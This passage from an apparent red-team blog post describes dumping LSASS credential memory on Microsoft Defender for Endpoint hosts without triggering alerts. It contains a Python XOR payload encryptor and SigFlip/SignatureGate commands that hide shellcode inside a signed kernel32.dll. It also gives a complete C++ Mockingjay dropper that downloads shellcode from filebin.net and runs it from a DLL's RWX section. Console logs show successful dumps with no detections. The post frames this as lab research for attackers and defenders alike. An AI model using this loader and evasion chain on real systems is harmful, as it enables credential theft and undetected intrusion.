    data = bytearray(open(sys.argv[1], "rb").read())
except:
    print("File argument needed! %s <raw payload file>" % sys.argv[0])
    sys.exit()

if len(sys.argv) > 2 and sys.argv[2] == "1":
    print("len: {}".format(len(data)))
    print('{ 0x' + ', 0x'.join(hex(x)[2:] for x in data) + ' };')
    sys.exit()
xord_byte_array = bytearray(len(data))
if len(sys.argv) > 2 and sys.argv[2] != "1":
    filename = sys.argv[2]

f = open(filename, "wb")

l = len(key)
for i in range(len(data)):
    current = data[i]
    current_key = key[i % len(key)]
    xord_byte_array[i] = current ^ current_key

f.write(xord_byte_array)
f.close()

print("XORed output saved to \"{}\"".format(filename))
print("Xor Key: {}".format(key.decode()))
sys.exit()
```

Process Injection Summary:

1. Use Blindside to spawn `RuntimeBroker.exe` as a debug process to get unhooked ntdll.
2. Use unhooked ntdll to convert all Process Hollowing APIs into Nt equivalents.
3. Add timer check for sandbox.
4. Add Process Mitigation Policy.
5. Remove `NtUnmapViewOfSection`
6. Download MiniDumpWrite API shellcode from Google Drive 
7. Perform process injection into MRT.exe to get an encrypted LSASS dump
8. Decrypt encrypted LSASS dump using python script.

<div style="page-break-after: always;"></div>

## Process Injection in a ASR excluded process using SignatureGate

[SignatureGate](https://github.com/florylsk/SignatureGate) is a weaponized version of HellsGate that abuses opt-in-fix CVE-2013-3900 based on the original [SharpHellsGate](https://github.com/am0nsec/SharpHellsGate) and [SigFlip](https://github.com/med0x2e/SigFlip) implementations.

SigFlip can first be used to patch our generated shellcode into an authenticode signed PE file such as `kernel32.dll` without breaking its authenticode signature or functionality. 

Since MDE does trust Microsoft signed code, we can leverage this for shellcode execution.
SignatureGate can then be used to execute the signed dll containing our shellcode using the HellsGate technique .

To dump the LSASS process using the MiniDumpWrite API in CSharp, similar to above we perform this execution in ASR excluded processes such as `WmiPrivSE.exe` to dump LSASS without trigerring MDE.

We use this Csharp code base, compile and analyse it using defender: https://github.com/0xAbdullah/Offensive-Snippets/blob/main/C%23/PInvoke/ASR_bypass_to_dump_LSASS.cs

```
PS D:\Work> .\ThreatCheck.exe -f EncryptedMiniDump_Csharp.exe
[+] Target file size: 7680 bytes
[+] Analyzing...
[!] Identified end of bad bytes at offset 0xF9B
00000000   73 69 76 65 53 6E 69 70  70 65 74 73 00 45 78 69   siveSnippets·Exi
00000010   74 53 74 61 74 75 73 00  4F 62 6A 65 63 74 00 6F   tStatus·Object·o
00000020   70 5F 45 78 70 6C 69 63  69 74 00 6C 70 45 6E 76   p_Explicit·lpEnv
00000030   69 72 6F 6E 6D 65 6E 74  00 68 53 74 64 49 6E 70   ironment·hStdInp
00000040   75 74 00 68 53 74 64 4F  75 74 70 75 74 00 77 53   ut·hStdOutput·wS
00000050   68 6F 77 57 69 6E 64 6F  77 00 49 6E 69 74 69 61   howWindow·Initia
00000060   6C 69 7A 65 41 72 72 61  79 00 6B 65 79 00 52 65   lizeArray·key·Re
00000070   61 64 50 72 6F 63 65 73  73 4D 65 6D 6F 72 79 00   adProcessMemory·
00000080   57 72 69 74 65 50 72 6F  63 65 73 73 4D 65 6D 6F   WriteProcessMemo
00000090   72 79 00 6C 70 43 75 72  72 65 6E 74 44 69 72 65   ry·lpCurrentDire
000000A0   63 74 6F 72 79 00 42 61  73 65 50 72 69 6F 72 69   ctory·BasePriori
000000B0   74 79 00 00 00 00 4B 43  00 3A 00 5C 00 57 00 69   ty····KC·:·\·W·i
000000C0   00 6E 00 64 00 6F 00 77  00 73 00 5C 00 53 00 79   ·n·d·o·w·s·\·S·y
000000D0   00 73 00 74 00 65 00 6D  00 33 00 32 00 5C 00 77   ·s·t·e·m·3·2·\·w
000000E0   00 62 00 65 00 6D 00 5C  00 57 00 6D 00 69 00 50   ·b·e·m·\·W·m·i·P
000000F0   00 72 00 76 00 53 00 45  00 2E 00 65 00 78 00 65   ·r·v·S·E·.·e·x·e
```

We find that there is a detection, mainly with APIs such as `WriteProcessMemory` and hardcoded processes such as `WmiPrivSE.exe`.

Convert it to shellcode using donut as follows: 

```
PS D:\Work> .\donut.exe -i .\EncryptedMiniDump_Csharp.exe

  [ Donut shellcode generator v1 (built Mar  3 2023 13:33:22)
  [ Copyright (c) 2019-2021 TheWover, Odzhan

  [ Instance type : Embedded
  [ Module file   : ".\EncryptedMiniDump_Csharp.exe"
  [ Entropy       : Random names + Encryption
  [ File type     : .NET EXE
  [ Target CPU    : x86+amd64
  [ AMSI/WDLP/ETW : continue
  [ PE Headers    : overwrite
  [ Shellcode     : "loader.bin"
  [ Exit          : Thread

# Test if shellcode works - lsass.dmp
PS D:\Work> .\runshc64.exe .\loader.bin
[*] Reading module from: .\loader.bin
>>> Creating a new thread...
[*] Running the shellcode [20d37860000 - 20d378697d5]
```

Analysing the shellcode binary file on we find no detections from defender:

```
PS D:\Work> .\ThreatCheck.exe -f EncryptedMiniDump_Csharp.bin
[+] No threat found!
```

Now, compiling and analysing the SignatureGate project we find no detections from defener: 

```
PS D:\Work> .\ThreatCheck.exe -f SignatureGate.exe
[+] No threat found!

PS D:\Work> .\ThreatCheck.exe -f SigFlip.exe
[+] No threat found!
```

Use SigFlip to generate a malicious signed `kernel32.dll` with our `EncryptedMiniDump_Csharp.bin` and a password for of choice for encryption as follows:

*NOTE: Use a fresh copy of `kernel32.dll` from `C:\Windows\System32`.*

```
PS D:\Work> .\SigFlip.exe -i .\kernel32.dll -s .\EncryptedMiniDump_Csharp.bin -o .\SigFlip\kernel32.dll -e Passw0rd!987

[+]:Loading/Parsing PE File '.\kernel32.dll'

[*]:.\kernel32.dll has a valid signature
[+]:Current PE File '.\kernel32.dll' SHA1 Hash is: 04CB6395C0BC665E8BFEAEBC79F0B354B2D157B5
[+]:Encrypting data/shellcode '.\EncryptedMiniDump_Csharp.bin' using 'Passw0rd!987' and injecting it to PE File '.\kernel32.dll'
[+]:Updating OPT Header fields/entries
[+]:Saving Modified PE file to '.\SigFlip\kernel32.dll'
[*]:.\SigFlip\kernel32.dll has a valid signature
[+]:Modified PE File '.\SigFlip\kernel32.dll' SHA1 Hash is: 82550959EE388F07359B35D35827861F14566F0B

[*]:Done
```

Now copy SignatureGate with all its depended dlls along with the generated malicious `.\SigFlip\kernel32.dll` onto the target MDE enabled host.

Attack Chain: 
1. Generate shellcode and pack it in a MS signed dll like kernel32.dll using SigFlip
2. Execute SignatureGate with encrypted password + malicious kernel32.dll 
3. LSASS Dumper shellcode is executed
4. Performs LSASS Dump using MiniDumpWriteAPI in ASR Excluded process - WmiPrivSE.exe 

Perform execution using our encryption password and the malicious `kernel32.dll` packing our LSASS dumper shellcode as follows:

```
C:\Users\administrator1\Desktop>.\SignatureGate.exe kernel32.dll Passw0rd!987
[+]:Loading/Parsing PE File 'kernel32.dll'

[+]:Scanning for Shellcode...
[+]: Shellcode located at c7160

C:\Users\administrator1\Desktop>dir
 Volume in drive C is Windows
 Volume Serial Number is 98FF-9D7F

 Directory of C:\Users\administrator1\Desktop

09/27/2023  09:22 AM    <DIR>          .
09/27/2023  08:34 AM    <DIR>          ..
04/13/2022  01:12 PM           771,496 clrcompression.dll
04/13/2022  01:12 PM         1,274,280 clrjit.dll
04/13/2022  01:13 PM         5,204,904 coreclr.dll
09/27/2023  09:15 AM           854,328 kernel32.dll
09/27/2023  09:22 AM        49,002,445 lsass.dmp
04/13/2022  01:13 PM         1,059,736 mscordaccore.dll
06/02/2023  09:04 AM        53,594,116 SignatureGate.exe
               7 File(s)    111,761,305 bytes
               2 Dir(s)  111,572,303,872 bytes free
```

We find that an `lsass.dmp` file ~50mb is generated.

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230927145738.png)

Noting for any alerts on MDE, no new alerts are found:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230823180840.png)

<div style="page-break-after: always;"></div>

## Process Injection using Process MockinJay

Official Blog: https://www.securityjoes.com/post/process-mockingjay-echoing-rwx-in-userland-to-achieve-code-execution

The concept revolves around housing our shellcode within a memory area that naturally allows Read-Write-Execute (RWX) permissions in a Dll. This memory region should be situated within a trusted Dll module and the process associated with it, eliminating the necessity for use typical process injection Windows/NT APIs like VirtualAllocEx that are flagged by AV/EDRs.

Two methods exist:
1. Self Injection: Find a vulnerable trusted Dll with RWX permissions to copy our shellcode into and load the Dll and execute shellcode.
2. Remote Injection: Leveraging trusted applications that use a vulnerable trusted Dll with RWX permissions to perform the same functionality as in Self Injection.

Since Remote Injection involves leveraging installed application which could vary on target applications we mainly focus on Self Injection.

To find Dll's with an RWX portion we can use a POC such as: https://github.com/pwnsauc3/RWXfinder


### Self Injection

POC reference used: `https://github.com/ewby/Mockingjay_POC/tree/main`

We begin by finding Dlls with an RWX portion using RWXfinder on a vm in the MDE testlab, however this results in not many findings.

```
C:\Users\administrator1\Desktop>.\rwxfinder.exe
```

Compiling the POC we find it is detected by default because of the hardcoded shellcode. 

We alter the source as follows and convert it to a C++ project to incorporate dropper functionality to download shellcode dynamically as before.

We also use the default `C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TeamFoundation\\Team Explorer\\Git\\usr\\bin\\msys-2.0.dll"` Dll (RWX) as suggested in the blog for shellcode execution.

```
#include <stdio.h>
#include <Windows.h>
#include <psapi.h>
#include <dbghelp.h>
#include <vector>
#include <winternl.h>
#include <winhttp.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "Dbghelp.lib")


// calculate the offset to the RWX memory region of a DLL
DWORD_PTR FindRWXOffset(HMODULE hModule)
{
    IMAGE_NT_HEADERS* ntHeader = ImageNtHeader(hModule);
    if (ntHeader != NULL)
    {
        IMAGE_SECTION_HEADER* sectionHeader = IMAGE_FIRST_SECTION(ntHeader);
        for (WORD i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
        {
            // check if section has RWX permissions
            if ((sectionHeader->Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
                (sectionHeader->Characteristics & IMAGE_SCN_MEM_WRITE))
            {
                DWORD_PTR baseAddress = (DWORD_PTR)hModule;
                DWORD_PTR sectionOffset = sectionHeader->VirtualAddress;
                DWORD_PTR rwxOffset = sectionOffset + baseAddress;
                return rwxOffset;
            }

            sectionHeader++;
        }
    }

    return 0;
}

std::vector<BYTE> Download(LPCWSTR baseAddress, LPCWSTR filename) {

    // initialise session
    HINTERNET hSession = WinHttpOpen(
        NULL,
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,    // proxy aware
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        WINHTTP_FLAG_ASYNC);          // disable ssl

    // create session for target
    HINTERNET hConnect = WinHttpConnect(
        hSession,
        baseAddress,
        INTERNET_DEFAULT_HTTP_PORT,            // port 80
        0);

    // create request handle
    HINTERNET hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        filename,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_BYPASS_PROXY_CACHE);                   // no ssl

    // send the request
    WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    // receive response
    WinHttpReceiveResponse(
        hRequest,
        NULL);

    // read the data
    std::vector<BYTE> buffer;
    DWORD bytesRead = 0;

    do {

        BYTE temp[4096]{};
        WinHttpReadData(hRequest, temp, sizeof(temp), &bytesRead);

        if (bytesRead > 0) {
            buffer.insert(buffer.end(), temp, temp + bytesRead);
        }

    } while (bytesRead > 0);

    // close all the handles
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);

    return buffer;
}

int main()
{
    HMODULE hModule = LoadLibraryW(L"C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TeamFoundation\\Team Explorer\\Git\\usr\\bin\\msys-2.0.dll");

    printf("[+] Module loaded...");

    if (hModule != NULL)
    {
        // calculate offset to loaded DLL RWX memory region
        DWORD_PTR rwxOffset = FindRWXOffset(hModule);
        printf("[+] Offset to RWX memory region: 0x%lx\n", rwxOffset);

        // Download shellcode
        std::vector<BYTE> shellcode = Download(L"www.filebin.net", L"/wj76iwfjn1axc8xy/msgbox.bin");

        // Convert shellcode to a char array
        unsigned char* shellcodeChar = reinterpret_cast<unsigned char*>(shellcode.data());
        SIZE_T shellcodeSize = shellcode.size();

        // Write shellcode to RWX memory region
        memcpy(reinterpret_cast<LPVOID>(rwxOffset), shellcodeChar, shellcodeSize);

        printf("[+] Shellcode Written to RWX Memory Region.\n");

        ((void(*)())rwxOffset)();

        // Pause the program
        printf("[*] Shellcode Executed ");

        // Unload the DLL
        FreeLibrary(hModule);
    }
    else
    {
        printf("Failed to load the DLL.\n");
    }

    return 0;
}
```

Recompiling, testing the msgbox POC and analysing it, we find it is undetected by defender:

```
PS D:\Work\pe2sh> & 'D:\Work\ThreatCheck.exe' -f D:\Work\MockingJay-SelfInjection-Dropper\mockingjay\x64\Release\mockingjay.exe
[+] No threat found!

PS D:\Work\pe2sh> & 'D:\Work\ThreatCheck.exe' -f D:\Work\rwxfinder.exe
[+] No threat found!
```

Now, altering it to execute our LSASSDumper encrypted shellcode as in prior techniques we find that the POC dosen't work.

```
// Download shellcode
        std::vector<BYTE> shellcode = Download(L"www.filebin.net", L"/wj76iwfjn1axc8xy/DLLHijackLSASSDumper2.bin");
```

This is mainly due to the fact that our current Dll with the free RWX section cannot accomodate the shellcode size of the LSASSDumper Shellcode.

```
C:\Users\localPC\Desktop>.\mockingjay.exe
[+] Module loaded...[+] Offset to RWX memory region: 0xe029b009
[+] Shellcode Written to RWX Memory Region.
```

We need to find another Dll suitable with a large enough RWX section. Attempting to find such Dlls on the target MDE testmachine we find none. However, running the sane on our local machine could result in interesting results such as follows:

```
C:\Users\localPC\Desktop>.\rwxfinder.exe
[snip]
[RWX] C:\\Program Files (x86)\Microsoft SDKs\NuGetPackages\Microsoft.NETCore.Runtime.CoreCLR-x64\1.0.0\runtimes\win7-x64\lib\dotnet\mscorlib.ni.dll
Section Name: .xdata
Virtual Size: 0x2C308
Virtual Address: 0x206000
Size of Raw Data: 0x2C400
Characteristics: 0xE0000040
---------------------------
```

To accomodate LSASSDumper shellcode size we use `C:\\Program Files (x86)\\Microsoft SDKs\\NuGetPackages\\Microsoft.NETCore.Runtime.CoreCLR-x64\\1.0.0\\runtimes\\win7-x64\\lib\\dotnet\\mscorlib.ni.dll` instead of the default  `C:\\Program Files\\Microsoft Visual Studio\\2022\\Community\\Common7\\IDE\\CommonExtensions\\Microsoft\\TeamFoundation\\Team Explorer\\Git\\usr\\bin\\msys-2.0.dll`.

Testing this POC on our local machine it works.

```
C:\Users\localPC\Desktop>.\mockingjay.exe
[+] Module loaded...[+] Offset to RWX memory region: 0xe019b000
[+] Shellcode Written to RWX Memory Region.
[+] Searching for LSASS PID
[+] LSASS PID: 844
[+] Starting dump to memory buffer
[+] Copied 49173962 bytes to memory buffer
[+] Successfully dumped LSASS to memory!
[+] Xor encrypting the memory buffer containing the dump data
[+] Xor key: jisjidpa123
[+] Enrypted dump data written to "LSASS_ENCRYPTED.DMP" file
```

Now since, `C:\\Program Files (x86)\\Microsoft SDKs\\NuGetPackages\\Microsoft.NETCore.Runtime.CoreCLR-x64\\1.0.0\\runtimes\\win7-x64\\lib\\dotnet\\mscorlib.ni.dll` isn't available on MDE by default we create a zip of `dotnet\\mscorlib.ni.dll`  and transfer it and unpack it on MDE.

```
C:\Users\administrator1\Desktop>dir
 Volume in drive C is Windows
 Volume Serial Number is 3A18-00BD

 Directory of C:\Users\administrator1\Desktop

10/11/2023  01:42 PM    <DIR>          .
10/11/2023  10:53 AM    <DIR>          ..
10/11/2023  11:19 AM    <DIR>          dotnet
10/11/2023  11:22 AM            16,384 mockingjay.exe
10/11/2023  09:18 AM           143,872 rwxfinder.exe
10/11/2023  11:14 AM        25,355,496 VC_redist.x64.exe
               3 File(s)     25,515,752 bytes
               3 Dir(s)  108,778,319,872 bytes free
```

We also alter the source to the new location of our copied DLL:

```
 //HMODULE hModule = LoadLibraryW(L"C:\\Users\\administrator1\\Desktop\\dotnet\\dotnet\\mscorlib.ni.dll");
```

Recompile the mockingjay POC and copy it over to the MDE testmachine and execute it to successfully perform an LSASS dump bypassing MDE. 

```
C:\Users\administrator1\Desktop>.\mockingjay.exe
[+] Module loaded...[+] Offset to RWX memory region: 0xe019b000
[+] Shellcode Written to RWX Memory Region.
[+] Searching for LSASS PID
[+] LSASS PID: 844
[+] Starting dump to memory buffer
[+] Copied 49173962 bytes to memory buffer
[+] Successfully dumped LSASS to memory!
[+] Xor encrypting the memory buffer containing the dump data
[+] Xor key: jisjidpa123
[+] Enrypted dump data written to "LSASS_ENCRYPTED.DMP" file

C:\Users\administrator1\Desktop>dir
 Volume in drive C is Windows
 Volume Serial Number is 3A18-00BD

 Directory of C:\Users\administrator1\Desktop

10/11/2023  11:25 AM    <DIR>          .
10/11/2023  10:53 AM    <DIR>          ..
10/11/2023  11:19 AM    <DIR>          dotnet
10/11/2023  11:24 AM        49,173,962 LSASS_ENCRYPTED.DMP
10/11/2023  11:22 AM            16,384 mockingjay.exe
10/11/2023  09:18 AM           143,872 rwxfinder.exe
10/11/2023  11:14 AM        25,355,496 VC_redist.x64.exe
               4 File(s)     74,689,714 bytes
               3 Dir(s)  110,654,418,944 bytes free
```


![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020231011165545.png)

Noting for any alerts on MDE, no new alerts are found:

![](https://raw.githubusercontent.com/m3rcer/m3rcer.github.io/refs/heads/master/_posts/redteaming/Exp_MDE_LSASS_Dump/Images/Pasted%20image%2020230823180840.png)

---- 

# Conclusion

In this blog, we explored various experiments targetting Microsoft Defender for Endpoint (MDE) while attempting to dump LSASS memory. Traditional techniques such as direct injection or basic handle opening are no longer viable against modern defensive controls, requiring more stealthy approaches like creating memory minidumps.
Understanding how detection mechanisms operate — from API hooking to handle creation monitoring and file signature detection — is critical for both attackers and defenders. By setting up a realistic evaluation lab and testing against MDE, we gain valuable insights into the strengths and weaknesses of defensive technologies, informing better red team tactics and blue team detection strategies alike.
Continuous testing, experimentation, and learning are vital as EDR capabilities and attacker methodologies evolve over time.

----

# References

- Microsoft Defender for Endpoint Trial: [Sign-up Portal](https://signup.microsoft.com/create-account/signup?products=7f379fee-c4f9-4278-b0a1-e4c8c2fcdf7e&ru=https://aka.ms/MDEp2OpenTrial?ocid=docs-wdatp-enablesiem-abovefoldlink)
- Microsoft Documentation: [Configure Microsoft Defender for Endpoint](https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/microsoft-defender-endpoint?view=o365-worldwide)
- James Forshaw's Research on Windows Access Tokens: [Access Token Internals](https://www.tiraniddo.dev/2017/10/windows-access-tokens-pt1.html)
- Project Zero: [Dumping LSASS Memory - Tricks and Techniques](https://googleprojectzero.blogspot.com/2021/06/windows-exploring-protected-processes.html)
- SpecterOps Blog: [MiniDumpWriteDump Detection Strategies](https://posts.specterops.io/a-tale-of-two-minidumps-80a120b708c6)
- Microsoft Security Blog: [How MDE Detects Credential Dumping](https://www.microsoft.com/en-us/security/blog/2020/09/22/new-detections-for-credential-dumping-techniques/)
